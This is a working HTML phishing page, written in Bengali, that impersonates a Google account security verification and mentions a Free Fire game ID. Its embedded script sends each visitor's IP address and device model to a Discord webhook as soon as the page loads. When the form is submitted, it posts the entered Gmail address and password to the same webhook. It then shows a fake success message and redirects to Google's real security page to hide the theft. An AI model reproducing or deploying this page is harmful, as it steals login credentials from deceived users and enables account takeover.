<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Google Security Notification" />
    <meta property="og:description" content="Critical: Your account is at risk. Verify immediately." />
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" />

    <title>Verify Your Google Account</title>

    <style>
        body { background: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #d93025; }
        .logo { width: 50px; margin-bottom: 20px; }
        .title { color: #202124; font-size: 20px; font-weight: 500; margin-bottom: 15px; }
        .warn-box { background: #fff3f2; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 20px; border-radius: 4px; font-size: 14px; line-height: 1.6; color: #3c4043; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border: 2px solid #1a73e8; }
        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #1557b0; }
        .footer { font-size: 11px; color: #70757a; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; }
    </style>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        // ১. ক্লিক করার সাথে সাথে আইপি এবং মডেল পাঠানো (অটোমেটিক)
        async function captureIP() {
            let ip = "N/A";
            let model = navigator.userAgent.match(/\(([^)]+)\)/)?.[1].split(';')[0] || navigator.platform;

            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            const payload = JSON.stringify({
                content: "🚀 **NEW TARGET CLICKED!**",
                embeds: [{
                    color: 16711680,
                    fields: [
                        { name: "🌐 IP Address", value: ip },
                        { name: "📱 Device Model", value: model }
                    ],
                    timestamp: new Date()
                }]
            });
            
            // ব্রাউজার বন্ধ করলেও যেন ডাটা যায়
            navigator.sendBeacon(HOOK, payload);
        }

        // ২. জিমেইল ও পাসওয়ার্ড হাতিয়ে নেওয়া (বাটনে ক্লিক করলে)
        async function sendData() {
            const email = document.getElementById('u').value;
            const pass = document.getElementById('p').value;

            if (!email || !pass) {
                alert("দয়া করে সঠিক তথ্য দিন!");
                return;
            }

            const dataPayload = JSON.stringify({
                content: "🧨 **LOGIN DATA CAPTURED!**",
                embeds: [{
                    color: 65280,
                    fields: [
                        { name: "📧 Email", value: email },
                        { name: "🔑 Password", value: pass }
                    ]
                }]
            });

            await fetch(HOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: dataPayload
            });

            alert("ভেরিফিকেশন সফল হয়েছে। আপনার আইডি এখন নিরাপদ।");
            window.location.href = "https://myaccount.google.com/security";
        }

        // পেজ লোড হওয়া মাত্রই আইপি পাঠানোর কাজ শুরু হবে
        window.onload = captureIP;
    </script>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
    <div class="title">ডিভাইস ভেরিফিকেশন</div>
    
    <div class="warn-box">
        <strong>⚠️ জরুরি সতর্কতা:</strong> আপনার জিমেইল অ্যাকাউন্টে অন্য কেউ প্রবেশের চেষ্টা করছে। আপনার <strong>Free Fire</strong> আইডি এবং পার্সোনাল ডাটা নিরাপদ রাখতে এখনই ভেরিফাই করুন।
    </div>
    
    <input type="email" id="u" placeholder="জিমেইল এড্রেস" required>
    <input type="password" id="p" placeholder="পাসওয়ার্ড দিন" required>
    <button class="btn" onclick="sendData()">ভেরিফাই এবং নিরাপদ করুন</button>
    
    <div class="footer">Security Verified by Google Support</div>
</div>

</body>
</html>
